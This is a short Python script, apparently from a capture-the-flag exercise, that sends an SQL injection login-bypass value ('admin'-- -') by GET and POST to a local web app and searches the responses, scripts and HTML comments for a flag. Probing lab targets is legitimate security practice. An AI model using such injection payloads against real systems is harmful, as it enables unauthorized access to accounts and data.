import requests
import re

target = "http://127.0.0.1:32895/index.php"

print("[DEEP DIVE] Comparing GET vs POST responses in detail\n")

# GET request
get_resp = requests.get(target, params={'username': "admin'-- -", 'password': 'x'})
print(f"[GET] Length: {len(get_resp.text)} bytes")

# POST request  
post_resp = requests.post(target, data={'username': "admin'-- -", 'password': 'x'})
print(f"[POST] Length: {len(post_resp.text)} bytes")

print(f"\n[DIFFERENCE] {abs(len(get_resp.text) - len(post_resp.text))} bytes\n")

# Let's look at the full HTML for any hidden flags or JavaScript
print("="*80)
print("[EXAMINING FULL HTML FOR HIDDEN CONTENT]")
print("="*80)

# Check in GET response
print("\n[GET Response Analysis]")
if 'FLAG{' in get_resp.text:
    flag_match = re.search(r'FLAG\{[^}]+\}', get_resp.text)
    print(f"[!!! FLAG FOUND IN GET RESPONSE !!!]")
    print(f"Flag: {flag_match.group(0)}")
    print(f"\nFull Response:\n{get_resp.text}")
    exit(0)

# Check in POST response
print("\n[POST Response Analysis]")
if 'FLAG{' in post_resp.text:
    flag_match = re.search(r'FLAG\{[^}]+\}', post_resp.text)
    print(f"[!!! FLAG FOUND IN POST RESPONSE !!!]")
    print(f"Flag: {flag_match.group(0)}")
    print(f"\nFull Response:\n{post_resp.text}")
    exit(0)

# Look for any JavaScript or hidden elements
print("\n[Searching for JS/hidden elements in GET response]")
if '<script' in get_resp.text.lower():
    # Extract script blocks
    scripts = re.findall(r'<script[^>]*>(.*?)</script>', get_resp.text, re.DOTALL | re.IGNORECASE)
    for i, script in enumerate(scripts):
        print(f"\n--- Script Block {i+1} ---")
        print(script[:500])
        if 'FLAG{' in script:
            flag_match = re.search(r'FLAG\{[^}]+\}', script)
            print(f"\n[!!! FLAG IN JAVASCRIPT !!!]: {flag_match.group(0)}")

# Look for HTML comments
print("\n[Searching for HTML comments]")
comments = re.findall(r'<!--(.*?)-->', get_resp.text, re.DOTALL)
for comment in comments:
    print(f"Comment: {comment.strip()}")
    if 'FLAG{' in comment:
        flag_match = re.search(r'FLAG\{[^}]+\}', comment)
        print(f"[!!! FLAG IN COMMENT !!!]: {flag_match.group(0)}")

# Let's print the full response to see what we're missing
print("\n" + "="*80)
print("[FULL GET RESPONSE]")
print("="*80)
print(get_resp.text)

print("\n" + "="*80)
print("[FULL POST RESPONSE]")  
print("="*80)
print(post_resp.text)

